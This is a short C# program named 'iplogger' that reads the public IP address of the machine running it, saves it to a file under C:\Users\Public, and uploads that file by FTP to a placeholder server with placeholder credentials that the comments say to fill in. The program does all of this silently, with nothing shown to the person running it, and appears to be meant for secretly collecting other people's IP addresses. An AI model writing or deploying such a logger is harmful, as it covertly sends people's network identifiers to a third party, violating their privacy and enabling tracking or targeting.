using System.IO;
using System.Net;

namespace iplogger
{
    class Ip
    {
        public static void Main(string[] args)
        {
            string publicip = new WebClient().DownloadString("http://icanhazip.com"); //gets the public ip and writes it into a string
            using (StreamWriter writetext = new StreamWriter("C:\\Users\\Public\\ip.txt")) //saves into C:\Users\Public\ the txt file
            {
                writetext.WriteLine(publicip);
            }
            WebClient client = new WebClient();
            client.Credentials = new NetworkCredential("user", "password"); //change "user" with the username of the ftp and "password" with your ftp password
            client.UploadFile("ftp://example:22", @"C:\Users\Public\ip.txt"); //change ftp://example:22 with the ip or hostname of your server
        }
    }
}